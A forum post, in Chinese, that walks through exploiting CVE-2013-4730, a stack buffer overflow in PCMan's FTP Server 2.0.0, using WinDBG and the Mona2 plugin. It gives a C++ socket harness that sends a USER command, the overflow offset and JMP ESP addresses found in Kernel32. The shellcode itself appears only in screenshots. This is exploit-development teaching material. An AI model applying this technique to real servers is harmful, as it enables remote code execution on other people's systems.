> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1591644-1-1.html)

> 前期 Mona2 是 Corelan Team 团队开发的一个专门用于辅助漏洞挖掘的脚本插件，Mona 可以帮助我们快读的定位溢出点，并且可以帮助我们查找一些用于溢出特殊指令，以及构成复杂 ... CVE-201......

![](https://avatar.52pojie.cn/data/avatar/001/78/49/30_avatar_middle.jpg)Nattevak _ 本帖最后由 Nattevak 于 2022-2-22 16:04 编辑_  
**前期**  
Mona2 是 Corelan Team 团队开发的一个专门用于辅助漏洞挖掘的脚本插件，Mona 可以帮助我们快读的定位溢出点，并且可以帮助我们查找一些用于溢出特殊指令，以及构成复杂攻击代码的小部件。  
**Mona2 安装流程**

*   l 首先需要安装 WSK，因为 WDK 自带 WinDBG
*   l 安装 Python2.7.2
*   l 安装 Visual C++2008 运行库
*   l 安装 WinDBG 的 Python 插件 “Pykd”
*   l 将 “mona.py” 与“windbglib.py”放到 WinDBG.exe 同目录下
*   l 运行 WinDBG 开始调试，使用 “.load pykd.pyd”、“!py mona” 命令即可开始使用 Mona  
    

**Mona2 常用命令**[Shell] _纯文本查看_ _复制代码_

```
//-加载Pykd插件
.load pykd.pyd
//-运行Mona
!py mona
//-在线更新mona
!py mona update
//-设置功能工作目录为“D:\Dir\进程名_线程ID\”需要管理员权限
! py mona config -set workingfolder "D:\Dir\%p_%i"
//-生成1000个字节的顺序字符串，用于测试溢出点
! py mona pc 1000
//-获取溢出点偏移（根据淹没返回地址的值判断）
! py mona po 0x12345678
//-查找“JMP ESP”、“PUSH ESP#RET”等指令
! py mona jmp -r esp
//-在“Kernel32.dll”中查找“JMP ESP”、“PUSH ESP#RET”等指令
! py mona jmp -r sep -m "Kernel32.dll"

```

**漏洞编号 CVE-2013-4730**  
![](https://attach.52pojie.cn/forum/202202/22/142825od591ht1nt1ptp51.png)

**image.png** _(73.94 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3NHxkY2VmZTQ2OXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

1

2022-2-22 14:28 上传

  
**1. 软件简介**  
PCMan's FTP Server 是洪任谕程序员所研发的一套 FTP 服务器软件。该软件具有体积小、功能简单等特点。  
**2. 漏洞成因**  
PCMan's FTP Server 2.0.0 版本中存在缓冲区溢出漏洞。该软件由于未能有效处理 FTP 命令的长度字符 (最大 0x1000)，进而在调用字符串拷贝函数时(和 sprintf 功能相同) 未判断长度引发栈溢出漏洞，远程攻击者可借助 USER 命令中的长字符串利用该漏洞执行任意代码。  
**3. 验证漏洞**  
作为网络通信协议而言，其一定会使用到 recv() 函数，故我们可以对 recv() 函数下断点，发送 POC 并进行单步跟踪直至找到漏洞函数。 ![](https://attach.52pojie.cn/forum/202202/22/142849stn3b4txb4bmlnh4.png)

**image.png** _(149.04 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3NXxkN2EzYTFmY3wxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

2

2022-2-22 14:28 上传

  
单步跟踪，我们可以看到栈中接收的数据从 12ED7C 开始  
![](https://attach.52pojie.cn/forum/202202/22/142909xv0v0nz0vjsvnajn.png)

**image.png** _(201.15 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3Nnw5MDI0ZDBmM3wxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

3

2022-2-22 14:29 上传

  
进入 sub_403E60 函数，运行至 sprintf 函数处，此时可使用 IDA 同步分析  
![](https://attach.52pojie.cn/forum/202202/22/142939udi2ogzgxddo2vva.png)

**image.png** _(27.07 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3N3w1NTA5ZWE4NnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

4

2022-2-22 14:29 上传

![](https://attach.52pojie.cn/forum/202202/22/142948xperzp494pejp18u.png)

**image.png** _(183.8 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3OHw3YjYxYjFiZXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

5

2022-2-22 14:29 上传

  
由上图可知 sprintf 函数的目的地址为 0012E568。 单步步过 sprintf 函数，观察内存窗口数据，此时已经完成字符串拼接  
![](https://attach.52pojie.cn/forum/202202/22/143002wgquj4uk9um5pf4q.png)

**image.png** _(183.83 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc3OXwyMGMzYmQ2ZnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

6

2022-2-22 14:30 上传

  
对应 IDA 中的信息可以发现，sprintf 函数直接复制字符串 a2，没有进行长度条件的限制  
![](https://attach.52pojie.cn/forum/202202/22/143018om1b18md6112mjmr.png)

**image.png** _(144.03 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4MHxiYTM5YjM3ZHwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

7

2022-2-22 14:30 上传

  
运行至 ret，观察堆栈情况，可以看到，由于 sprintf 函数没有进行限制长度条件的判断，导致堆栈溢出覆盖了返回地址，此时程序会发生崩溃。  
![](https://attach.52pojie.cn/forum/202202/22/143155n06xtu3046455k0k.png)

**image.png** _(165.76 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4MXxjMzQ3MTliZnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

8

2022-2-22 14:31 上传

  
**4. 搞定 CVE-2013-4730**  
①前提我们需要一份能与 FTP 进行交互的代码触发此漏洞，其步骤如下：  
1) 建立 Socket 连接，连接目标 FTP  
2) 接受 FTP 服务器的欢迎语  
3)发送 “USER XXX” 登陆请求  
4) 接受请求结果（但是这里不会走到这一步，此时 FTP 服务器已经被攻击完了）  
②准备对 PCMan's FTP Server 程序进行通讯测试  
[C++] _纯文本查看_ _复制代码_

```
#include #pragma comment(lib,"Ws2_32.lib")
#include int _tmain(int argc, _TCHAR* argv[])
{
        //1.初始化Winsock服务
        WSADATA stWSA;
        WSAStartup(0x0202, &stWSA);
        //2.创建一个原始套接字
        SOCKET stListen = INVALID_SOCKET;
        stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        //3.在任意地址（INADDR_ANY）上绑定一个端口21
        SOCKADDR_IN stService;
        stService.sin_addr.s_addr = inet_addr("127.0.0.1");
        stService.sin_port = htons(21);
        stService.sin_family = AF_INET;
        connect(stListen, (LPSOCKADDR)&stService, sizeof(stService));
        //4.接受欢迎语
        char szRecv[0x100] = { 0 };
        recv(stListen, szRecv, sizeof(szRecv), 0);
        //5.发送登录请求
        char cExpolit[] = "USER anonymous";//Expolit容器
        send(stListen, cExpolit, strlen(cExpolit), 0);
        recv(stListen, szRecv, sizeof(szRecv), 0);
        //6.关闭相关句柄并释放相关资源
        closesocket(stListen);
        WSACleanup();
} 
```

![](https://attach.52pojie.cn/forum/202202/22/143252at2a1p111jx2vt12.png)

**image.png** _(93.02 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4M3xkNDc5NzZhNnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

9

2022-2-22 14:32 上传

  
③测试启动 PCMan's FTP Server 程序后，使用 WinDBG 附加程序（File->Attach to a Process 或 快捷键 F6）  
![](https://attach.52pojie.cn/forum/202202/22/143310fy23nb3thknybow1.png)

**image.png** _(69.23 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4NHxlOWRjNDYwZHwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

10

2022-2-22 14:33 上传

  
使用 “.load pykd.pyd”、“!py mona” 命令开始使用 Mona  
![](https://attach.52pojie.cn/forum/202202/22/143327sgkofxu9kiqck8kx.png)

**image.png** _(107.82 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4NXw3NTcwMzE4MnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

11

2022-2-22 14:33 上传

  
使用 Mona 命令 “! py mona pc 3000” 生成 3000 个字节的顺序字符串，用于测试溢出点  
![](https://attach.52pojie.cn/forum/202202/22/143342dj677p2wt871eu1j.png)

**image.png** _(57.81 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4Nnw2NDE5MjU0YXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

12

2022-2-22 14:33 上传

  
使用 Mona 生成的有序长字符串进行测试，替换掉之前的 “USER anonymmous” 字符串  
![](https://attach.52pojie.cn/forum/202202/22/143358nj68a63etrxr6et6.png)

**image.png** _(173.98 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4N3w3ZGUxZGZmY3wxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

13

2022-2-22 14:33 上传

  
再次测试程序，发现程序崩溃了，查看其反馈的异常信息  
![](https://attach.52pojie.cn/forum/202202/22/143416wg0b3iafk8zfmm37.png)

**image.png** _(165.89 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4OHxiZmMyMjhjMnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

14

2022-2-22 14:34 上传

![](https://attach.52pojie.cn/forum/202202/22/143429rqzjs3l3ccqslllo.png)

**image.png** _(129.48 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc4OXw3ZmIzMjkwMHwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

15

2022-2-22 14:34 上传

  
  
  
使用 WinDBG 调试，并验证  
![](https://attach.52pojie.cn/forum/202202/22/143444gzkruror9llrizau.png)

**image.png** _(26.75 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5MHwyYjU4ZjUyZnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

16

2022-2-22 14:34 上传

  
查看栈帧结构，发现栈已被 POC 发送的数据填满，可以确定存在缓冲区溢出漏洞  
![](https://attach.52pojie.cn/forum/202202/22/143459u8jpjpn5uvc1rzzu.png)

**image.png** _(21.88 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5MXwwOTQ2ZmNjMnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

17

2022-2-22 14:34 上传

  
使用 Mona2 的命令 “!py mona po 0x396f4338” 获取溢出点偏移（根据淹没返回地址的值判断）  
![](https://attach.52pojie.cn/forum/202202/22/143519zp8s0g9bisfdz9sf.png)

**image.png** _(140.5 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5MnwzMDBlNzBlOXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

18

2022-2-22 14:35 上传

  
溢出点已经确认，接下来我们需要用 Mona2 在目标程序空间中找到一个跳板指令 “JMP ESP” 使用 Mona 命令 “! py mona jmp -r esp” 查找 “JMP ESP”、“PUSH ESP#RET” 等指令  
![](https://attach.52pojie.cn/forum/202202/22/143536xmclgcmemulmleox.png)

**image.png** _(178.81 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5M3w1MmRhMTE3ZHwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

19

2022-2-22 14:35 上传

  
可以发现，我们使用的是字符串传输方式，其中默认 00 为结束符，如果我们使用的字符串中含有 00 可能会产生截断，所以使用指定模块查找方法，即使用 Mona 命令 “! py mona jmp -r sep -m "Kernel32.dll"” 在“Kernel32.dll”中查找 “JMP ESP”、“PUSH ESP#RET” 等指令  
![](https://attach.52pojie.cn/forum/202202/22/143554xlllwf18luf5010s.png)

**image.png** _(169.16 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5NHw5NGM0MTE4YnwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

20

2022-2-22 14:35 上传

  
一般来说，图中的三个地址 0x7661f8f7、0x7661f7df、0x765619b8 都可以使用为跳板指令。  
④攻击  
![](https://attach.52pojie.cn/forum/202202/22/143614p7nf9fcxfxvfnu7r.png)

**image.png** _(290.45 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5NXxmOGVkY2ZjZXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

21

2022-2-22 14:36 上传

  
![](https://attach.52pojie.cn/forum/202202/22/143625obb20bbcnqmhmqns.png)

**image.png** _(229.13 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5NnwzMmI2YmE4Y3wxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

22

2022-2-22 14:36 上传

  
由上文可知偏移为 2006，其中 “USER” 占 5 位（USER 后有一个空格），所以此处使用的偏移应为 2001。将 JMP ESP 的地址填充到 RetnAddr 的位置，使用此地址覆盖返回地址后，将我们自己的 Shellcode 随后放在其后面即可。  
利用成功  
![](https://attach.52pojie.cn/forum/202202/22/143700atv55pgbcbyylyac.png)

**image.png** _(87.22 KB, 下载次数: 0)_

[下载附件](forum.php?mod=attachment&aid=MjQ5Njc5N3wxN2U5Mjg0ZXwxNjQ1NTMzNzIwfDIxMzQzMXwxNTkxNjQ0&nothumb=yes)

23

2022-2-22 14:37 上传![](https://avatar.52pojie.cn/images/noavatar_middle.gif)yasenhacker 攻击完了就可以提权控制目标吗？